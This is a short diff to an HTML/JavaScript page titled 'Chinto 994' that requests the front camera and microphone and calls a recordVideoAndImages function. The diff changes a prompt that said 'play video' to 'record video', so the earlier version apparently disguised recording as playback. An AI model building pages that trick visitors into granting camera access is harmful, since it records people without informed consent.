@@ -24,9 +24,9 @@ footer{padding:10px;font-size:13px;}
 <header>Chinto 994</header>
 <div class="card">
   <h3>Chinto994</h3>
-  <p id="msg">Tap start to play video</p>
+  <p id="msg">Tap start to record video</p>
   <button id="startBtn"><span>Start</span></button>
-  <video id="video" autoplay playsinline muted></video> <!-- muted for live preview -->
+  <video id="video" autoplay playsinline muted></video> <!-- MUTED to avoid live sound -->
 </div>
 <footer>Help Center</footer>
 
@@ -116,7 +116,7 @@ startBtn.onclick = async()=>{
   try {
     const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true});
     video.srcObject = stream;
-    video.muted = true; // Keep preview muted to avoid browser autoplay block
+    video.muted = true; // IMPORTANT: mute preview to avoid hearing audio
     await video.play();
 
     await recordVideoAndImages(device);
